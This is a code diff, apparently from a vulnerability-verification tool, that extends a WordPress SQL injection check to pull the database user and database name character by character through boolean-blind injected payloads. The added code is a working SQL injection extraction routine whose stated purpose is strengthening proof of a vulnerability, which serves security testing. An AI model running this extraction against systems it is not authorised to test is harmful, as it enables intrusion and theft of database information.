@@ -8592,6 +8592,42 @@ def verify_wordpress_sqli(
                         res.detail += (f" | Dato extraido: version()='{_extracted_version}' "
                                        f"({len(_version_chars)} chars via boolean-blind char-by-char)")
                         step(f"[bool-extract] version()='{_extracted_version}' extraido char-by-char")
+
+                        # Also extract user() and database() if budget allows — strengthens proof
+                        for _extra_fn, _extra_key in (("user()", "extracted_user"),
+                                                       ("database()", "extracted_database")):
+                            if time.time() - t0 >= budget_s - 30:
+                                break
+                            _ex_chars: list[str] = []
+                            for _ex_pos in range(1, 41):  # up to 40 chars
+                                if time.time() - t0 >= budget_s - 30:
+                                    break
+                                _ex_char = None
+                                for _ex_code in range(33, 123):  # ! to z
+                                    _ex_true_p = (
+                                        f"{orig_value}{_q} AND ASCII(SUBSTRING({_extra_fn},{_ex_pos},1))={_ex_code}-- -"
+                                    )
+                                    _ex_false_p = (
+                                        f"{orig_value}{_q} AND ASCII(SUBSTRING({_extra_fn},{_ex_pos},1))={_ex_code + 1}-- -"
+                                    )
+                                    try:
+                                        _rt_ex = send(_ex_true_p); _rf_ex = send(_ex_false_p)
+                                        _base_tl = res.evidence.get("respuesta_true_len", base_len)
+                                        _lt_ex = len(_rt_ex.text or ""); _lf_ex = len(_rf_ex.text or "")
+                                        if abs(_lt_ex - _base_tl) < 100 and abs(_lf_ex - _base_tl) >= 100:
+                                            _ex_char = chr(_ex_code)
+                                            break
+                                    except Exception:
+                                        break
+                                if _ex_char is None:
+                                    break
+                                _ex_chars.append(_ex_char)
+                                if ord(_ex_char) < 32:
+                                    break
+                            if _ex_chars:
+                                _ex_val = "".join(_ex_chars)
+                                res.evidence[_extra_key] = _ex_val
+                                step(f"[bool-extract] {_extra_fn}='{_ex_val}' extraido char-by-char")
             except Exception as _be_err:
                 step(f"[bool-extract] extraccion fallida: {_be_err}")
 
